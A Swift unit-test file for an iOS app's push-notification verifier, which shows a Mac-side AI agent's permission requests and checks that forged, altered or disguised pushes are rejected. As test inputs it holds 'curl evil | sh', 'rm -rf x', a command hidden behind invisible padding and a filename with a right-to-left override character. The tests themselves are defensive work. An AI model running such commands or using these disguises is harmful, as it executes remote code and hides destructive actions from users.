import CryptoKit
import SideAProtocol
import SideARemoteKit
import SideARemoteShared
import UserNotifications
import XCTest
@testable import SideARemote

@MainActor
final class PushOpenerTests: XCTestCase {
    private let key = PushKey(key: SymmetricKey(size: .bits256), keyID: Data([1, 2, 3, 4]))

    // Its own keychain service: the app's shared item holding the real pairings is never read or written here.
    private let keychain = SharedKeychain(service: "test.pushopener.\(UUID().uuidString)")

    private func verified(_ request: UNNotificationRequest) -> PushPayload? { PushOpener.verified(request, keychain: keychain) }

    override func setUp() async throws {
        let mac = PairedMac(endpoint: Endpoint(macID: "spoof-mac", baseURL: URL(string: "https://100.64.0.1:47800")!, serverKeyHash: "k", name: "MacBook Pro"),
                            deviceID: "d1", deviceName: "iPhone")
        XCTAssertTrue(keychain.set(try JSONEncoder().encode([mac]), for: "macs"))
    }

    override func tearDown() async throws {
        keychain.set(nil, for: "macs")
    }

    private func seal(_ payload: PushPayload, category: PushCategory = .request, collapseID: String = "r1", deviceID: String = "d1") throws -> String {
        try PushEnvelope.seal(try JSONEncoder().encode(payload), with: key, category: category, collapseID: collapseID, deviceID: deviceID)
    }

    private func request(gate: AllowGate) -> PushPayload {
        PushPayload(t: "request", mac: "m1", sent: 0, rid: "r1", sid: "s1", title: "Allow Bash", subtitle: "side-a · Work",
                    body: "swift test", gate: gate, agent: .claude)
    }

    func testARequestOpensWithTheMacsWords() throws {
        let sealed = try seal(request(gate: .unlock))
        guard case .opened(let payload, let data) = PushOpener.open(sealed, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r1")
        else { return XCTFail("didn't open") }
        let content = UNMutableNotificationContent()
        content.userInfo = ["e": sealed]
        PushOpener.fill(content, with: payload, data: data, category: .request, identifier: "r1")
        XCTAssertEqual(content.title, "Allow Bash")
        XCTAssertEqual(content.body, "swift test")
        XCTAssertEqual(content.threadIdentifier, "side-a")
        XCTAssertEqual(content.categoryIdentifier, "REQUEST")
        XCTAssertNil(content.userInfo["e"])
        XCTAssertEqual(content.userInfo["rid"] as? String, "r1")
        XCTAssertEqual(PushPayload(userInfo: content.userInfo)?.rid, "r1")
    }

    func testAPayloadMovedElsewhereDoesNotOpen() throws {
        let sealed = try seal(request(gate: .unlock), category: .finished)
        XCTAssertUnreadable(PushOpener.open(sealed, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r1"))
        let other = try seal(request(gate: .unlock))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r2"))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d2", macID: "m1", category: .request, collapseID: "r1"))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d1", macID: "another-mac", category: .request, collapseID: "r1"))
    }

    func testAnUnreadablePushOffersOnlyOpen() {
        let content = UNMutableNotificationContent()
        content.userInfo = ["e": "x"]
        content.categoryIdentifier = "REQUEST"
        PushOpener.generic(content, body: nil)
        XCTAssertEqual(content.categoryIdentifier, "OPEN")
        XCTAssertNil(content.userInfo["e"])
    }

    private func XCTAssertUnreadable(_ opened: PushOpener.Opened, file: StaticString = #filePath, line: UInt = #line) {
        if case .unreadable = opened { return }
        XCTFail("opened", file: file, line: line)
    }

    func testACutCommandOffersOpenOnly() throws {
        let cut = PushPayload(t: "request", mac: "m1", sent: 0, rid: "r1", sid: "s1", title: "Allow Bash", body: "npm test", gate: .lockScreen,
                              full: false)
        guard case .opened(let payload, let data) = PushOpener.open(try seal(cut), key: key, deviceID: "d1", macID: "m1", category: .request,
                                                                    collapseID: "r1") else { return XCTFail() }
        let content = UNMutableNotificationContent()
        PushOpener.fill(content, with: payload, data: data, category: .request, identifier: "r1")
        XCTAssertEqual(content.categoryIdentifier, "OPEN")
        XCTAssertTrue(content.body.hasSuffix("Open to see the full command."))
    }

    func testASecondPushUnderTheSameIDCantChangeTheWords() throws {
        let real = PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "spoof-r1", sid: "s1", title: "Allow Bash",
                               subtitle: "side-a · Work", body: "curl evil | sh", gate: .unlock, agent: .claude)
        let data = try JSONEncoder().encode(real)
        let filled = UNMutableNotificationContent()
        PushOpener.fill(filled, with: real, data: data, category: .request, identifier: "spoof-r1")
        defer { PushCache.remove("spoof-r1") }
        XCTAssertNotNil(verified(UNNotificationRequest(identifier: "spoof-r1", content: filled, trigger: nil)))

        let spoof = UNMutableNotificationContent()
        spoof.title = "Allow Read"
        spoof.subtitle = "side-a · Work"
        spoof.body = "README.md"
        spoof.categoryIdentifier = "REQUEST"
        XCTAssertNil(verified(UNNotificationRequest(identifier: "spoof-r1", content: spoof, trigger: nil)))
        for change in [\UNMutableNotificationContent.title, \.subtitle, \.body] {
            guard let one = filled.mutableCopy() as? UNMutableNotificationContent else { return XCTFail() }
            one[keyPath: change] = "changed"
            XCTAssertNil(verified(UNNotificationRequest(identifier: "spoof-r1", content: one, trigger: nil)))
        }
    }

    func testEveryKindTheMacSendsIsShownAsSent() throws {
        let sent: [(PushKind, PushCategory)] = [(.finished, .finished), (.limit, .limit), (.health, .health), (.rotation, .rotation), (.test, .test)]
        for (kind, category) in sent {
            let payload = PushPayload(t: kind.rawValue, mac: "spoof-mac", sent: 0, sid: "s1", title: "Now on Personal", body: "5-hour 96%", account: "Personal")
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: payload, data: try JSONEncoder().encode(payload), category: category, identifier: "kind-\(kind.rawValue)")
            defer { PushCache.remove("kind-\(kind.rawValue)") }
            XCTAssertEqual(filled.categoryIdentifier, category.rawValue, kind.rawValue)
            XCTAssertEqual(verified(UNNotificationRequest(identifier: "kind-\(kind.rawValue)", content: filled, trigger: nil)), payload,
                           kind.rawValue)
        }
        let untitled = PushPayload(t: PushKind.rotation.rawValue, mac: "m", sent: 0)
        XCTAssertEqual(PushOpener.words(untitled).title, "Autopilot moved your sessions")
    }

    func testReadyForSeveralSessionsIsOpenOnlyAndAnUpdateIsQuiet() throws {
        let group = PushPayload(t: PushKind.finished.rawValue, mac: "m", sent: 0, title: "3 sessions ready", body: "side-a, relay, site", quiet: true)
        let filled = UNMutableNotificationContent()
        filled.sound = .default
        PushOpener.fill(filled, with: group, data: try JSONEncoder().encode(group), category: .finished, identifier: "ready-group")
        defer { PushCache.remove("ready-group") }
        XCTAssertEqual(filled.categoryIdentifier, PushCategory.open.rawValue)
        XCTAssertEqual(filled.title, "3 sessions ready")
        XCTAssertEqual(filled.body, "side-a, relay, site")
        XCTAssertNil(filled.sound)

        let one = PushPayload(t: PushKind.finished.rawValue, mac: "m", sent: 0, sid: "s1", title: "side-a", turnID: "t1", summary: "Done.")
        let single = UNMutableNotificationContent()
        single.sound = .default
        PushOpener.fill(single, with: one, data: try JSONEncoder().encode(one), category: .finished, identifier: "ready-one")
        defer { PushCache.remove("ready-one") }
        XCTAssertEqual(single.categoryIdentifier, PushCategory.finished.rawValue)
        XCTAssertNotNil(single.sound)
    }

    func testAReplacementReadyCantRedirectAnEarlierReply() throws {
        func ready(_ session: String, turn: String) -> PushPayload {
            PushPayload(t: PushKind.finished.rawValue, mac: "spoof-mac", sent: 0, sid: session, title: "side-a", turnID: turn, summary: "Done.")
        }
        let first = ready("s1", turn: "t1"), second = ready("s2", turn: "t2")
        let shown = UNMutableNotificationContent()
        PushOpener.fill(shown, with: first, data: try JSONEncoder().encode(first), category: .finished, identifier: "ready-same")
        let replacement = UNMutableNotificationContent()
        PushOpener.fill(replacement, with: second, data: try JSONEncoder().encode(second), category: .finished, identifier: "ready-same")
        defer {
            PushCache.remove("ready-same")
            for content in [shown, replacement] { PushCache.remove("ready-same_" + (content.userInfo["h"] as? String ?? "")) }
        }
        XCTAssertEqual(PushOpener.words(first), PushOpener.words(second))
        XCTAssertEqual(verified(UNNotificationRequest(identifier: "ready-same", content: shown, trigger: nil)), first)
        XCTAssertEqual(verified(UNNotificationRequest(identifier: "ready-same", content: replacement, trigger: nil)), second)

        guard let older = shown.mutableCopy() as? UNMutableNotificationContent else { return XCTFail() }
        older.userInfo.removeValue(forKey: "h")
        XCTAssertNil(verified(UNNotificationRequest(identifier: "ready-same", content: older, trigger: nil)))
        guard let swapped = shown.mutableCopy() as? UNMutableNotificationContent else { return XCTFail() }
        swapped.userInfo["h"] = replacement.userInfo["h"]
        XCTAssertNil(verified(UNNotificationRequest(identifier: "ready-same", content: swapped, trigger: nil)))
    }

    func testASecondPushCantChangeTheCategory() throws {
        func shown(_ payload: PushPayload, as category: String) throws -> Bool {
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: payload, data: try JSONEncoder().encode(payload), category: payload.gate == .biometric ? .requestDestructive : .request,
                            identifier: "spoof-c")
            defer { PushCache.remove("spoof-c") }
            filled.categoryIdentifier = category
            return verified(UNNotificationRequest(identifier: "spoof-c", content: filled, trigger: nil)) != nil
        }
        func payload(_ gate: AllowGate) -> PushPayload {
            PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "spoof-c", title: "Allow Bash", body: "rm -rf x", gate: gate)
        }
        XCTAssertTrue(try shown(payload(.biometric), as: "REQUEST_DESTRUCTIVE"))
        XCTAssertFalse(try shown(payload(.biometric), as: "REQUEST"))
        XCTAssertFalse(try shown(payload(.biometric), as: "PLAN"))
        XCTAssertTrue(try shown(payload(.unlock), as: "REQUEST"))
        XCTAssertFalse(try shown(payload(.unlock), as: "REQUEST_SAFE"))
        XCTAssertFalse(try shown(payload(.unlock), as: "PLAN"))
    }

    func testTheReviewDemosOwnRequestStillVerifies() throws {
        PushCache.store(try JSONEncoder().encode(ReviewDemo.payload), for: ReviewDemo.requestID)
        defer { PushCache.remove(ReviewDemo.requestID) }
        let request = UNNotificationRequest(identifier: ReviewDemo.requestID, content: ReviewDemo.content(ReviewDemo.payload), trigger: nil)
        XCTAssertEqual(verified(request)?.rid, ReviewDemo.requestID)
    }

    func testACardWithoutAPayloadShowsNoneOfThePushsWords() {
        let card = NotificationCardModel(category: "REQUEST", payload: nil)
        XCTAssertEqual(card.title, "Side A")
        XCTAssertEqual(card.subtitle, "")
        XCTAssertEqual(card.body, "")
        XCTAssertEqual(NotificationCategories.actions(for: nil)?.map(\.identifier), ["OPEN"])
        XCTAssertNil(NotificationCategories.actions(for: request(gate: .unlock)))
    }

    func testACardShowsThePayloadsWords() {
        let card = NotificationCardModel(category: "REQUEST", payload: request(gate: .unlock))
        XCTAssertEqual(card.title, "Allow Bash")
        XCTAssertEqual(card.subtitle, "side-a · Work")
        XCTAssertEqual(card.body, "swift test")
    }

    func testAnythingHiddenInARequestLosesTheLockScreensAllow() throws {
        let hidden = PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "esc", title: "Read a file", body: "README\u{202E}dm.txt", gate: .lockScreen)
        let filled = UNMutableNotificationContent()
        PushOpener.fill(filled, with: hidden, data: try JSONEncoder().encode(hidden), category: .request, identifier: "esc")
        defer { PushCache.remove("esc") }
        XCTAssertEqual(filled.categoryIdentifier, "REQUEST")
        XCTAssertEqual(filled.body, "README\\u{202E}dm.txt")
        XCTAssertFalse(PushOpener.allowsLocked(hidden))
        XCTAssertNotNil(verified(UNNotificationRequest(identifier: "esc", content: filled, trigger: nil)))
        XCTAssertTrue(PushOpener.allowsLocked(request(gate: .lockScreen)))
    }

    func testACommandPaddedPastTheCardOpensWhateverTheMacSays() throws {
        for padding in [String(repeating: "\u{2003}", count: 400), String(repeating: "\u{2800}", count: 400), String(repeating: "x", count: 500)] {
            let padded = PushPayload(t: "request", mac: "m1", sent: 0, rid: "pad", title: "Run a command", body: "ls" + padding + "; python3 x", gate: .lockScreen, full: true)
            XCTAssertFalse(PushOpener.allowsLocked(padded))
            XCTAssertTrue(PushOpener.cutOff(padded))
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: padded, data: try JSONEncoder().encode(padded), category: .request, identifier: "pad")
            defer { PushCache.remove("pad") }
            XCTAssertEqual(filled.categoryIdentifier, "OPEN")
        }
    }

    func testAPlanCutToFitOffersOpenAndNeverApprove() throws {
        // swiftlint:disable:next discouraged_optional_boolean -- absent `full` is its own case here
        func shown(full: Bool?) throws -> String {
            let plan = PushPayload(t: "plan", mac: "spoof-mac", sent: 0, rid: "plan1", sid: "s1", title: "Plan ready", body: "Step one", plan: "Step one", full: full)
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: plan, data: try JSONEncoder().encode(plan), category: .plan, identifier: "plan1")
            defer { PushCache.remove("plan1") }
            XCTAssertNotNil(verified(UNNotificationRequest(identifier: "plan1", content: filled, trigger: nil)))
            return filled.categoryIdentifier
        }
        XCTAssertEqual(try shown(full: false), PushCategory.open.rawValue)
        XCTAssertEqual(try shown(full: true), PushCategory.plan.rawValue)
        XCTAssertEqual(try shown(full: nil), PushCategory.plan.rawValue)
    }

    func testARequestPutBackAfterAFailedAnswerStillOffersAllowAndDeny() throws {
        let payload = PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "r1", sid: "s1", title: "Allow Bash", subtitle: "side-a · Work",
                                  body: "swift test", gate: .unlock, agent: .claude)
        let content = UNMutableNotificationContent()
        PushOpener.fill(content, with: payload, data: try JSONEncoder().encode(payload), category: .request, identifier: "r1")
        defer { PushCache.remove("r1") }
        let original = UNNotificationRequest(identifier: "r1", content: content, trigger: nil)
        XCTAssertEqual(verified(original), payload)
        let kept = AppDelegate.retained(original)
        XCTAssertEqual(kept.identifier, "r1")
        XCTAssertEqual(kept.content.categoryIdentifier, "REQUEST")
        XCTAssertEqual(verified(kept), payload)

        let notice = AppDelegate.failureNotice("Already answered on the Mac.", for: payload, original: original)
        XCTAssertNotEqual(notice.identifier, "r1")
        XCTAssertEqual(notice.content.body, "Already answered on the Mac.")
        XCTAssertNil(verified(notice))
    }

    func testAFailedAnswerGivesTheMacsReasonAndNotAlwaysUnreachable() {
        let payload = request(gate: .unlock)
        XCTAssertEqual(AppDelegate.failureReason(.failed("This request has expired."), payload: payload), "This request has expired.")
        XCTAssertEqual(AppDelegate.failureReason(.queued(mac: "Studio"), payload: payload), "Couldn't reach Studio. Open to answer.")
        XCTAssertNil(AppDelegate.failureReason(.sent, payload: payload))
    }

    func testAQuietNoticeIsClearedPerMacByTheBackPush() {
        XCTAssertEqual(AppDelegate.quietNoticeID("abc"), "mac-quiet-abc")
        XCTAssertTrue(AppDelegate.clearQuietNotice(["back": "abc"]))
        XCTAssertFalse(AppDelegate.clearQuietNotice(["verify": ["install": "i"]]))
        XCTAssertFalse(AppDelegate.clearQuietNotice(["back": ""]))
    }

    func testOnlyNotificationsNeverAskedAreAskedAgainNotSentToSettings() {
        XCTAssertEqual(ConnectionTest.notificationsOff(.notDetermined), ConnectionTest.notAsked)
        XCTAssertNil(ConnectionTest.notificationsOff(.authorized))
        guard case .failed(_, let detail) = ConnectionTest.notificationsOff(.denied) else { return XCTFail() }
        XCTAssertEqual(detail, "Turn them on in Settings › Notifications.")
    }

    func testCleartextIsNeverActedOn() {
        let payload = PushPayload(t: "request", mac: "m1", sent: 0, rid: "forged", title: "Read README.md", gate: .lockScreen)
        let content = UNMutableNotificationContent()
        content.categoryIdentifier = "REQUEST_SAFE"
        content.userInfo = ["p": (try? JSONSerialization.jsonObject(with: JSONEncoder().encode(payload))) ?? [:]]
        XCTAssertNil(verified(UNNotificationRequest(identifier: "forged", content: content, trigger: nil)))
    }
}
